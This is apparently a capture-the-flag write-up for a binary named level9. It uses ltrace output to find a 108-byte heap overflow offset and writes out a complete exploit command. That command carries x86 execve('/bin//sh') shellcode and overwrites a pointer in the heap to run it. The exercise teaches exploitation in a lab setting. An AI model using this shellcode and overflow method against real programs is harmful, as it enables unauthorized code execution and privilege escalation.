### 1. Find the offset to make the setAnnotation call write in this_00

```bash
$ ltrace ./level9 aaa
__libc_start_main(0x80485f4, 2, 0xbffff7f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff7f4, 0xbffff800, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff800, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("aaa") = 3
memcpy(0x0804a00c, "aaa", 3) = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11) +++
```

this_00 is allocated at 0x804a078 and memcpy write at 0x0804a00c. So the offset is 108.

### 2. Write paylaod

We need to write the address to shellcode, the shellcode (21 bytes), 83 random bytes and the address 0x0804a00c (the address of the shellcode address in heap).

### 3. Execute with exploit

```bash
$ ./level9 $(python -c 'print "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "a" * (108 - 25) + "\x0c\xa0\x04\x08"')
```
